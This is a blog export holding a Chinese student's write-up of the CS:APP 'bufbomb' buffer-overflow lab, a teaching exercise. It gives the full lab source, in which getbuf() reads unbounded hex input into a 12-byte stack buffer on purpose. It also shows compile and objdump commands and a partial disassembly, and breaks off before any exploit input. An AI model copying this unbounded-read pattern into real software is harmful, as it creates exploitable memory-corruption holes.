<?xml version="1.0" encoding="GB2312"?>
<?xml-stylesheet type="text/xsl" href="showart.xsl"?>
<BLOG>
<USER_ID>107680</USER_ID>
<USER_USERNAME><![CDATA[pigsybeard]]></USER_USERNAME>

<USER_STATUS>0</USER_STATUS>
<BLOG_NAME><![CDATA[年轻的战场]]></BLOG_NAME>
<BLOG_BRIEF><![CDATA[青春在技术的海洋里纵情怒放]]></BLOG_BRIEF>
<BLOG_DESCSIZE>500</BLOG_DESCSIZE>
<BLOG_NUMBERPAGE>20</BLOG_NUMBERPAGE>
<BLOG_CLASS>0</BLOG_CLASS>
<BLOG_CLASSNAME></BLOG_CLASSNAME>

<BLOG_INFO>姓名： 朱涛
职业： 学生
年龄： 19 
位置： HITCS
信条：千淘万漉虽辛苦，吹尽狂沙始到金
主页：http://hi.baidu.com/pigbeard
</BLOG_INFO>
<UP_PIC>up_user.jpg</UP_PIC>
<UP_PIC_PRE>up_user_pre.jpg</UP_PIC_PRE>
<BROWSER>MSIE</BROWSER>
<ISCOMMENT>1</ISCOMMENT>
<COMMENTS>0</COMMENTS>
<GUESTBOOKS>0</GUESTBOOKS>
<ARICLES>14</ARICLES>
<CLICKS>1237</CLICKS>
<STAR>0</STAR>
<STARNUMBER>0</STARNUMBER>
<BLOG_LEVEL>0星级BLOG</BLOG_LEVEL>
<COMPLAINT>0</COMPLAINT>
<DOMAIN>pigsybeard</DOMAIN>

<STYLE_BODYCOLOR>#FFFFFF</STYLE_BODYCOLOR>
<STYLE_BODYBGIMAGE></STYLE_BODYBGIMAGE>
<STYLE_TOPCOLOR>#187218</STYLE_TOPCOLOR>
<STYLE_TOPBGIMAGE>http://www.cublog.cn/templates/green/images/bg_top.gif</STYLE_TOPBGIMAGE>
<STYLE_TOPBGREPEAT>no-repeat</STYLE_TOPBGREPEAT>
<STYLE_TARGET></STYLE_TARGET>
<ARTILCE_CLASS>
<ATRICLE_CLASS_ITEM>
<ID>130996</ID>
<TITLE><![CDATA[Linux/Unix环境开发]]></TITLE>
<PID>0</PID>
<UDATE>2010-02-03 10:10:23</UDATE>
</ATRICLE_CLASS_ITEM>
<ATRICLE_CLASS_ITEM>
<ID>130989</ID>
<TITLE><![CDATA[操作系统]]></TITLE>
<PID>0</PID>
<UDATE>2010-02-03 10:10:29</UDATE>
</ATRICLE_CLASS_ITEM>
<ATRICLE_CLASS_ITEM>
<ID>130997</ID>
<TITLE><![CDATA[算法]]></TITLE>
<PID>0</PID>
<UDATE>2010-02-03 10:10:09</UDATE>
</ATRICLE_CLASS_ITEM>
<ATRICLE_CLASS_ITEM>
<ID>130990</ID>
<TITLE><![CDATA[web服务器]]></TITLE>
<PID>0</PID>
<UDATE>2010-02-03 10:10:37</UDATE>
</ATRICLE_CLASS_ITEM>
<ATRICLE_CLASS_ITEM>
<ID>130992</ID>
<TITLE><![CDATA[Java]]></TITLE>
<PID>0</PID>
<UDATE>2010-02-03 10:10:43</UDATE>
</ATRICLE_CLASS_ITEM>
<ATRICLE_CLASS_ITEM>
<ID>130991</ID>
<TITLE><![CDATA[c/c++]]></TITLE>
<PID>0</PID>
<UDATE>2010-02-03 10:10:51</UDATE>
</ATRICLE_CLASS_ITEM>
<ATRICLE_CLASS_ITEM>
<ID>130994</ID>
<TITLE><![CDATA[asm]]></TITLE>
<PID>0</PID>
<UDATE>2010-02-03 10:10:58</UDATE>
</ATRICLE_CLASS_ITEM>
<ATRICLE_CLASS_ITEM>
<ID>130993</ID>
<TITLE><![CDATA[Python]]></TITLE>
<PID>0</PID>
<UDATE>2010-02-03 10:11:05</UDATE>
</ATRICLE_CLASS_ITEM>
<ATRICLE_CLASS_ITEM>
<ID>130995</ID>
<TITLE><![CDATA[Linux应用]]></TITLE>
<PID>0</PID>
<UDATE>2010-02-03 10:11:11</UDATE>
</ATRICLE_CLASS_ITEM>
<ATRICLE_CLASS_ITEM>
<ID>131000</ID>
<TITLE><![CDATA[日记]]></TITLE>
<PID>0</PID>
<UDATE>2010-02-03 10:16:14</UDATE>
</ATRICLE_CLASS_ITEM>
</ARTILCE_CLASS>
<PHOTO_CLASS>
</PHOTO_CLASS>
<FAVORITES_CLASS>
</FAVORITES_CLASS>
<MUSIC_CLASS>
</MUSIC_CLASS>
<DateItems>"20091220","20091221","20100106","20100203","20100228",""</DateItems>
		<ATRICLE>
		<ID>2126543</ID>
		<TITLE><![CDATA[缓冲区溢出攻击实验之CSAPP:bufbomb――我的触雷体]]></TITLE>
		<PID>130991</PID>
		<UDATE>2009-12-21 00:25:00</UDATE>
		<EDATE>2009-12-21 00:25:00</EDATE>
		<ISCOMMENT>1</ISCOMMENT>
		<COMMENTS>0</COMMENTS>
		<ARTTYPE>原创</ARTTYPE>
		<CLICKS>74</CLICKS>
		<SOURCE><![CDATA[]]></SOURCE>
		<CONTENT><![CDATA[<span class="Apple-style-span" style="font-family: Arial; color: rgb(51, 51, 51); line-height: 20px; -webkit-border-horizontal-spacing: 2px; -webkit-border-vertical-spacing: 2px; "><font size="3" style="line-height: normal; "><span class="Apple-tab-span" style="white-space:pre">	</span>最近在学习《CS:APP》，在第三章有一个叫做bufbomb的练习。<br style="line-height: normal; ">题目给出一个程序的代码，要求设计一个输入的十六进制字符串，使getbuf（）对test返回-559038737 （0xdeadbeef）（详细见下文）。<br style="line-height: normal; "><br style="line-height: normal; "><span class="Apple-tab-span" style="white-space:pre">	</span>真的跟bufbomb名字一样，在搞这个的过程中，就像是在搞炸弹，一不小心一切都得废掉，重新再来。昨天已经炸了我半个下午了。实在是没能搞定，郁闷之中，参照《CS:APP》写了个网络通信的程序，干到夜里1点钟，还算有点成果。<br style="line-height: normal; "><br style="line-height: normal; "><span class="Apple-tab-span" style="white-space:pre">	</span>今天下午，进行了CSAPP的讨论班中，经过讨论发现用以前的那种思路真的暂时是搞不定的，终于在盛剑的帮助下，通过一种号称猥琐流的办法将其搞定。在这里一是拜盛剑的强大功利，二是拜GCC的才智～～！</font><font color="#ff0000" size="3" style="line-height: normal; ">Orz<br style="line-height: normal; "></font><font size="3" style="line-height: normal; "><br style="line-height: normal; "><span class="Apple-tab-span" style="white-space:pre">	</span>这个过程，没有能够直接在编译之后产生的可执行文件正常运行的过程中实现，而是在gdb的调试方式中达到的（这是因为GCC目前所具有的缓冲区溢出保护机制造成的，下文会说关于这种保护机制可参见<a target="_blank" href="http://www.linuxeden.com/html/sysadmin/20090601/65948.html" style="color: rgb(0, 34, 128); text-decoration: none; line-height: normal; ">这里</a>。）<br style="line-height: normal; "><br style="line-height: normal; "><span class="Apple-tab-span" style="white-space:pre">	</span>现在将这个过程的曲折，在此道明。<br style="line-height: normal; "><br style="line-height: normal; "><span class="Apple-tab-span" style="white-space:pre">	</span>对下面bufbomb.c的程序，设计一个输入语句进行缓冲区溢出的攻击，代码如下：<br style="line-height: normal; "><br style="line-height: normal; "></font><font size="3" style="line-height: normal; "><font class="Apple-style-span" color="#00FF00"><span class="Apple-style-span" style="font-size: medium;"><span class="Apple-style-span" style="color: rgb(0, 0, 0); font-family: 'Courier New', Courier, 宋体; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; font-size: 12px; "><table border="1" cellspacing="0" cellpadding="0" bordercolor="#999999" width="95%" bgcolor="#F1F1F1" style="border-collapse: collapse; "><tbody><tr style="font-size: 10pt; "><td style="font-size: 10pt; "><p style="font-size: 10pt; line-height: 19px; margin-top: 5px; margin-right: 5px; margin-bottom: 5px; margin-left: 5px; "><code><span style="color: rgb(0, 0, 0); "><span style="color: rgb(255, 153, 0); ">//////////////////////bufbomb.c////////////////////////////////////////<br style="font-size: 10pt; "></span><br style="font-size: 10pt; "><span style="color: rgb(255, 153, 0); ">/* Bomb program that is solved using a buffer overflow attack */</span><br style="font-size: 10pt; "><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 204); ">#</span><span style="color: rgb(255, 0, 0); ">include</span>&nbsp;<span style="color: rgb(0, 0, 204); ">&lt;</span>stdio<span style="color: rgb(0, 0, 204); ">.</span>h<span style="color: rgb(0, 0, 204); ">&gt;</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 204); ">#</span><span style="color: rgb(255, 0, 0); ">include</span>&nbsp;<span style="color: rgb(0, 0, 204); ">&lt;</span>stdlib<span style="color: rgb(0, 0, 204); ">.</span>h<span style="color: rgb(0, 0, 204); ">&gt;</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 204); ">#</span><span style="color: rgb(255, 0, 0); ">include</span>&nbsp;<span style="color: rgb(0, 0, 204); ">&lt;</span><span style="color: rgb(255, 0, 0); ">ctype</span><span style="color: rgb(0, 0, 204); ">.</span>h<span style="color: rgb(0, 0, 204); ">&gt;</span><br style="font-size: 10pt; "><br style="font-size: 10pt; "><span style="color: rgb(255, 153, 0); ">/* Like gets, except that characters are typed as pairs of hex digits.<br style="font-size: 10pt; ">Nondigit characters are ignored. Stops when encounters newline */</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); ">char</span>&nbsp;<span style="color: rgb(0, 0, 204); ">*</span>getxs<span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 255); ">char</span>&nbsp;<span style="color: rgb(0, 0, 204); ">*</span>dest<span style="color: rgb(0, 0, 204); ">)</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 204); ">{</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); "><span class="Apple-tab-span" style="white-space:pre">	</span>int</span>&nbsp;c<span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); "><span class="Apple-tab-span" style="white-space:pre">	</span>int</span>&nbsp;even&nbsp;<span style="color: rgb(0, 0, 204); ">=</span>&nbsp;1<span style="color: rgb(0, 0, 204); ">;</span>&nbsp;<span style="color: rgb(255, 153, 0); ">/* Have read even number of digits */</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); "><span class="Apple-tab-span" style="white-space:pre">	</span>int</span>&nbsp;otherd&nbsp;<span style="color: rgb(0, 0, 204); ">=</span>&nbsp;0<span style="color: rgb(0, 0, 204); ">;</span>&nbsp;<span style="color: rgb(255, 153, 0); ">/* Other hex digit of pair */</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); "><span class="Apple-tab-span" style="white-space:pre">	</span>char</span>&nbsp;<span style="color: rgb(0, 0, 204); ">*</span>sp&nbsp;<span style="color: rgb(0, 0, 204); ">=</span>&nbsp;dest<span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); "><span class="Apple-tab-span" style="white-space:pre">	</span>while</span>&nbsp;<span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 204); ">(</span>c&nbsp;<span style="color: rgb(0, 0, 204); ">=</span>&nbsp;<span style="color: rgb(255, 0, 0); ">getchar</span><span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 204); ">)</span><span style="color: rgb(0, 0, 204); ">)</span>&nbsp;<span style="color: rgb(0, 0, 204); ">!</span><span style="color: rgb(0, 0, 204); ">=</span>&nbsp;<span style="color: rgb(255, 0, 0); ">EOF</span>&nbsp;<span style="color: rgb(0, 0, 204); ">&amp;</span><span style="color: rgb(0, 0, 204); ">&amp;</span>&nbsp;c&nbsp;<span style="color: rgb(0, 0, 204); ">!</span><span style="color: rgb(0, 0, 204); ">=</span>&nbsp;<span style="color: rgb(255, 0, 255); ">'\n'</span><span style="color: rgb(0, 0, 204); ">)</span>&nbsp;<span style="color: rgb(0, 0, 204); ">{</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); "><span class="Apple-tab-span" style="white-space:pre">		</span>if</span>&nbsp;<span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(255, 0, 0); ">isxdigit</span><span style="color: rgb(0, 0, 204); ">(</span>c<span style="color: rgb(0, 0, 204); ">)</span><span style="color: rgb(0, 0, 204); ">)</span>&nbsp;<span style="color: rgb(0, 0, 204); ">{</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); "><span class="Apple-tab-span" style="white-space:pre">			</span>int</span>&nbsp;val<span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); "><span class="Apple-tab-span" style="white-space:pre">			</span>if</span>&nbsp;<span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(255, 0, 255); ">'0'</span>&nbsp;<span style="color: rgb(0, 0, 204); ">&lt;</span><span style="color: rgb(0, 0, 204); ">=</span>&nbsp;c&nbsp;<span style="color: rgb(0, 0, 204); ">&amp;</span><span style="color: rgb(0, 0, 204); ">&amp;</span>&nbsp;c&nbsp;<span style="color: rgb(0, 0, 204); ">&lt;</span><span style="color: rgb(0, 0, 204); ">=</span>&nbsp;<span style="color: rgb(255, 0, 255); ">'9'</span><span style="color: rgb(0, 0, 204); ">)</span><br style="font-size: 10pt; "><span class="Apple-tab-span" style="white-space:pre">				</span>val&nbsp;<span style="color: rgb(0, 0, 204); ">=</span>&nbsp;c&nbsp;<span style="color: rgb(0, 0, 204); ">-</span>&nbsp;<span style="color: rgb(255, 0, 255); ">'0'</span><span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); "><span class="Apple-tab-span" style="white-space:pre">			</span>else</span>&nbsp;<span style="color: rgb(0, 0, 255); ">if</span>&nbsp;<span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(255, 0, 255); ">'A'</span>&nbsp;<span style="color: rgb(0, 0, 204); ">&lt;</span><span style="color: rgb(0, 0, 204); ">=</span>&nbsp;c&nbsp;<span style="color: rgb(0, 0, 204); ">&amp;</span><span style="color: rgb(0, 0, 204); ">&amp;</span>&nbsp;c&nbsp;<span style="color: rgb(0, 0, 204); ">&lt;</span><span style="color: rgb(0, 0, 204); ">=</span>&nbsp;<span style="color: rgb(255, 0, 255); ">'F'</span><span style="color: rgb(0, 0, 204); ">)</span><br style="font-size: 10pt; "><span class="Apple-tab-span" style="white-space:pre">				</span>val&nbsp;<span style="color: rgb(0, 0, 204); ">=</span>&nbsp;c&nbsp;<span style="color: rgb(0, 0, 204); ">-</span>&nbsp;<span style="color: rgb(255, 0, 255); ">'A'</span>&nbsp;<span style="color: rgb(0, 0, 204); ">+</span>&nbsp;10<span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); "><span class="Apple-tab-span" style="white-space:pre">			</span>else</span><br style="font-size: 10pt; "><span class="Apple-tab-span" style="white-space:pre">				</span>val&nbsp;<span style="color: rgb(0, 0, 204); ">=</span>&nbsp;c&nbsp;<span style="color: rgb(0, 0, 204); ">-</span>&nbsp;<span style="color: rgb(255, 0, 255); ">'a'</span>&nbsp;<span style="color: rgb(0, 0, 204); ">+</span>&nbsp;10<span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); "><span class="Apple-tab-span" style="white-space:pre">			</span>if</span>&nbsp;<span style="color: rgb(0, 0, 204); ">(</span>even<span style="color: rgb(0, 0, 204); ">)</span>&nbsp;<span style="color: rgb(0, 0, 204); ">{</span><br style="font-size: 10pt; "><span class="Apple-tab-span" style="white-space:pre">				</span>otherd&nbsp;<span style="color: rgb(0, 0, 204); ">=</span>&nbsp;val<span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span class="Apple-tab-span" style="white-space:pre">				</span>even&nbsp;<span style="color: rgb(0, 0, 204); ">=</span>&nbsp;0<span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 204); "><span class="Apple-tab-span" style="white-space:pre">			</span>}</span>&nbsp;<span style="color: rgb(0, 0, 255); ">else</span>&nbsp;<span style="color: rgb(0, 0, 204); ">{</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 204); "><span class="Apple-tab-span" style="white-space:pre">				</span>*</span>sp<span style="color: rgb(0, 0, 204); ">+</span><span style="color: rgb(0, 0, 204); ">+</span>&nbsp;<span style="color: rgb(0, 0, 204); ">=</span>&nbsp;otherd&nbsp;<span style="color: rgb(0, 0, 204); ">*</span>&nbsp;16&nbsp;<span style="color: rgb(0, 0, 204); ">+</span>&nbsp;val<span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span class="Apple-tab-span" style="white-space:pre">				</span>even&nbsp;<span style="color: rgb(0, 0, 204); ">=</span>&nbsp;1<span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 204); "><span class="Apple-tab-span" style="white-space:pre">		</span>}</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 204); "><span class="Apple-tab-span" style="white-space:pre">	</span>}</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 204); ">}</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 204); "><span class="Apple-tab-span" style="white-space:pre">	</span>*</span>sp<span style="color: rgb(0, 0, 204); ">+</span><span style="color: rgb(0, 0, 204); ">+</span>&nbsp;<span style="color: rgb(0, 0, 204); ">=</span>&nbsp;<span style="color: rgb(255, 0, 255); ">'\0'</span><span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); "><span class="Apple-tab-span" style="white-space:pre">	</span>return</span>&nbsp;dest<span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 204); ">}</span><br style="font-size: 10pt; "><br style="font-size: 10pt; "><span style="color: rgb(255, 153, 0); ">/* $begin getbuf-c */</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); ">int</span>&nbsp;getbuf<span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 204); ">)</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 204); ">{</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); "><span class="Apple-tab-span" style="white-space:pre">	</span>char</span>&nbsp;buf<span style="color: rgb(0, 0, 204); ">[</span>12<span style="color: rgb(0, 0, 204); ">]</span><span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span class="Apple-tab-span" style="white-space:pre">	</span>getxs<span style="color: rgb(0, 0, 204); ">(</span>buf<span style="color: rgb(0, 0, 204); ">)</span><span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); "><span class="Apple-tab-span" style="white-space:pre">	</span>return</span>&nbsp;1<span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 204); ">}</span><br style="font-size: 10pt; "><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); ">void</span>&nbsp;<span style="color: rgb(255, 0, 0); ">test</span><span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 204); ">)</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 204); ">{</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); "><span class="Apple-tab-span" style="white-space:pre">	</span>int</span>&nbsp;val<span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span style="color: rgb(255, 0, 0); "><span class="Apple-tab-span" style="white-space:pre">	</span>printf</span><span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(255, 0, 255); ">"Type Hex string:"</span><span style="color: rgb(0, 0, 204); ">)</span><span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span class="Apple-tab-span" style="white-space:pre">	</span>val&nbsp;<span style="color: rgb(0, 0, 204); ">=</span>&nbsp;getbuf<span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 204); ">)</span><span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span style="color: rgb(255, 0, 0); "><span class="Apple-tab-span" style="white-space:pre">	</span>printf</span><span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(255, 0, 255); ">"getbuf returned 0x%x\n"</span><span style="color: rgb(0, 0, 204); ">,</span>&nbsp;val<span style="color: rgb(0, 0, 204); ">)</span><span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 204); ">}</span><br style="font-size: 10pt; "><span style="color: rgb(255, 153, 0); ">/* $end getbuf-c */</span><br style="font-size: 10pt; "><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); ">int</span>&nbsp;main<span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 204); ">)</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 204); ">{</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); "><span class="Apple-tab-span" style="white-space:pre"><font class="Apple-style-span" color="#000000">	</font></span>int</span>&nbsp;buf<span style="color: rgb(0, 0, 204); ">[</span>16<span style="color: rgb(0, 0, 204); ">]</span><span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span style="color: rgb(255, 153, 0); ">/* This little hack is an attempt to get the stack to be in a&nbsp;stable position*/</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); "><span class="Apple-tab-span" style="white-space:pre">	</span>int</span>&nbsp;offset&nbsp;<span style="color: rgb(0, 0, 204); ">=</span>&nbsp;<span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 255); ">int</span><span style="color: rgb(0, 0, 204); ">)</span>&nbsp;buf<span style="color: rgb(0, 0, 204); ">)</span>&nbsp;<span style="color: rgb(0, 0, 204); ">&amp;</span>&nbsp;0xFFF<span style="color: rgb(0, 0, 204); ">)</span><span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); "><span class="Apple-tab-span" style="white-space:pre">	</span>int</span>&nbsp;<span style="color: rgb(0, 0, 204); ">*</span>space&nbsp;<span style="color: rgb(0, 0, 204); ">=</span>&nbsp;<span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 255); ">int</span>&nbsp;<span style="color: rgb(0, 0, 204); ">*</span><span style="color: rgb(0, 0, 204); ">)</span>&nbsp;alloca<span style="color: rgb(0, 0, 204); ">(</span>offset<span style="color: rgb(0, 0, 204); ">)</span><span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 204); "><span class="Apple-tab-span" style="white-space:pre">	</span>*</span>space&nbsp;<span style="color: rgb(0, 0, 204); ">=</span>&nbsp;0<span style="color: rgb(0, 0, 204); ">;</span>&nbsp;<span style="color: rgb(255, 153, 0); ">/* So that don''t get complaint of unused variable */</span><br style="font-size: 10pt; "><span style="color: rgb(255, 0, 0); "><span class="Apple-tab-span" style="white-space:pre">	</span>test</span><span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 204); ">)</span><span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 255); "><span class="Apple-tab-span" style="white-space:pre">	</span>return</span>&nbsp;0<span style="color: rgb(0, 0, 204); ">;</span><br style="font-size: 10pt; "><span style="color: rgb(0, 0, 204); ">}</span></span></code></p></td></tr></tbody></table></span></span></font><br></font></span><div><span class="Apple-style-span" style="font-family: Arial; color: rgb(51, 51, 51); line-height: 20px; -webkit-border-horizontal-spacing: 2px; -webkit-border-vertical-spacing: 2px; "><font size="3" style="line-height: normal; "><span class="Apple-tab-span" style="white-space:pre">	</span>我用的操作系统是ubuntu 9.10，内核版本 2.6.31.16， 编译器 GCC-4.4.1<br style="line-height: normal; ">首先，用GCC编译了这个程序： $ gcc -g bufbomb.c -o bufbomb<br style="line-height: normal; ">之后，使用objdump反汇编这个可执行程序： objdump -d bufbomb&gt;bufbomb.s<br style="line-height: normal; "><br style="line-height: normal; ">根据反汇编的代码：<br style="line-height: normal; "><br></font></span></div><div><span class="Apple-style-span" style="font-family: Arial; color: rgb(51, 51, 51); line-height: 20px; -webkit-border-horizontal-spacing: 2px; -webkit-border-vertical-spacing: 2px; "><font size="3" style="line-height: normal; "><span class="Apple-style-span" style="color: rgb(0, 0, 0); font-family: 'Courier New', Courier, 宋体; -webkit-border-horizontal-spacing: 0px; -webkit-border-vertical-spacing: 0px; font-size: 12px; "><table border="1" cellspacing="0" cellpadding="0" bordercolor="#999999" width="95%" bgcolor="#F1F1F1" style="border-collapse: collapse; "><tbody><tr style="font-size: 10pt; "><td style="font-size: 10pt; "><p style="font-size: 10pt; line-height: 19px; margin-top: 5px; margin-right: 5px; margin-bottom: 5px; margin-left: 5px; "><code><span style="color: rgb(0, 0, 0); ">08048593&nbsp;<span style="color: rgb(0, 0, 204); ">&lt;</span>getbuf<span style="color: rgb(0, 0, 204); ">&gt;</span><span style="color: rgb(0, 0, 204); ">:</span><br style="font-size: 10pt; ">8048593<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;55&nbsp;<span class="Apple-tab-span" style="white-space:pre">			</span><span style="color: rgb(0, 0, 255); ">push<span class="Apple-tab-span" style="white-space:pre">	</span></span>%<span style="color: rgb(255, 0, 0); ">ebp</span><br style="font-size: 10pt; ">8048594<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;89 e5&nbsp;<span class="Apple-tab-span" style="white-space:pre">			</span><span style="color: rgb(0, 0, 255); ">mov<span class="Apple-tab-span" style="white-space:pre">	</span></span>%esp<span style="color: rgb(0, 0, 204); ">,</span><span style="color: rgb(0, 0, 204); ">%</span><span style="color: rgb(255, 0, 0); ">ebp</span><br style="font-size: 10pt; ">8048596<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;83 ec 28&nbsp;<span class="Apple-tab-span" style="white-space:pre">		</span><span style="color: rgb(0, 0, 255); ">sub</span>&nbsp;<span class="Apple-tab-span" style="white-space:pre">	</span>$0x28<span style="color: rgb(0, 0, 204); ">,</span><span style="color: rgb(0, 0, 204); ">%</span>esp<br style="font-size: 10pt; ">8048599<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;65 a1 14 00 00 00&nbsp;<span class="Apple-tab-span" style="white-space:pre">	</span><span style="color: rgb(0, 0, 255); ">mov</span>&nbsp;<span class="Apple-tab-span" style="white-space:pre">	</span>%<span style="color: rgb(255, 0, 0); ">gs</span><span style="color: rgb(0, 0, 204); ">:</span>0x14<span style="color: rgb(0, 0, 204); ">,</span><span style="color: rgb(0, 0, 204); ">%</span><span style="color: rgb(255, 0, 0); ">eax</span><br style="font-size: 10pt; ">804859f<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;89 45 f4&nbsp;<span class="Apple-tab-span" style="white-space:pre">		</span><span style="color: rgb(0, 0, 255); ">mov</span>&nbsp;<span class="Apple-tab-span" style="white-space:pre">	</span>%<span style="color: rgb(255, 0, 0); ">eax</span><span style="color: rgb(0, 0, 204); ">,</span><span style="color: rgb(0, 0, 204); ">-</span>0xc<span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 204); ">%</span><span style="color: rgb(255, 0, 0); ">ebp</span><span style="color: rgb(0, 0, 204); ">)</span><br style="font-size: 10pt; ">80485a2<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;31 c0&nbsp;<span class="Apple-tab-span" style="white-space:pre">			</span><span style="color: rgb(0, 0, 255); ">xor</span>&nbsp;<span class="Apple-tab-span" style="white-space:pre">	</span>%<span style="color: rgb(255, 0, 0); ">eax</span><span style="color: rgb(0, 0, 204); ">,</span><span style="color: rgb(0, 0, 204); ">%</span><span style="color: rgb(255, 0, 0); ">eax</span><br style="font-size: 10pt; ">80485a4<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;8d 45 e8&nbsp;<span class="Apple-tab-span" style="white-space:pre">		</span><span style="color: rgb(0, 0, 255); ">lea</span>&nbsp;<span class="Apple-tab-span" style="white-space:pre">	</span><span style="color: rgb(0, 0, 204); ">-</span>0x18<span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 204); ">%</span><span style="color: rgb(255, 0, 0); ">ebp</span><span style="color: rgb(0, 0, 204); ">)</span><span style="color: rgb(0, 0, 204); ">,</span><span style="color: rgb(0, 0, 204); ">%</span><span style="color: rgb(255, 0, 0); ">eax</span><br style="font-size: 10pt; ">80485a7<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;89 04 24&nbsp;<span class="Apple-tab-span" style="white-space:pre">		</span><span style="color: rgb(0, 0, 255); ">mov</span>&nbsp;<span class="Apple-tab-span" style="white-space:pre">	</span>%<span style="color: rgb(255, 0, 0); ">eax</span><span style="color: rgb(0, 0, 204); ">,</span><span style="color: rgb(0, 0, 204); ">(</span><span style="color: rgb(0, 0, 204); ">%</span>esp<span style="color: rgb(0, 0, 204); ">)</span><br style="font-size: 10pt; ">80485aa<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;e8 15 ff ff ff&nbsp;<span class="Apple-tab-span" style="white-space:pre">	</span><span style="color: rgb(0, 0, 255); ">call</span>&nbsp;<span class="Apple-tab-span" style="white-space:pre">	</span>80484c4&nbsp;<span style="color: rgb(0, 0, 204); ">&lt;</span>getxs<span style="color: rgb(0, 0, 204); ">&gt;</span><br style="font-size: 10pt; ">80485af<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;b8 01 00 00 00&nbsp;<span class="Apple-tab-span" style="white-space:pre">	</span><span style="color: rgb(0, 0, 255); ">mov</span>&nbsp;<span class="Apple-tab-span" style="white-space:pre">	</span>$0x1<span style="color: rgb(0, 0, 204); ">,</span><span style="color: rgb(0, 0, 204); ">%</span><span style="color: rgb(255, 0, 0); ">eax</span><br style="font-size: 10pt; ">80485b4<span style="color: rgb(0, 0, 204); ">:</span>&nbsp;8b 